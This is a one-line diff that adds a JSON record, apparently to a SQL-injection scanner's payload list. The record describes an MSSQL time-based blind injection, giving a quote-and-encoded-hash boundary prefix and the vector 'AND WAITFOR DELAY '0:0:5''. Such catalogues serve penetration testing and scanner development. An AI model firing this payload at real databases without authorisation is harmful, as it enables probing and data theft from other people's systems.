@@ -1,0 +1,1 @@
+{"dbms": "mssql", "technique": "time", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND WAITFOR DELAY '0:0:5'", "comment": "mssql time: single+enc hash"}
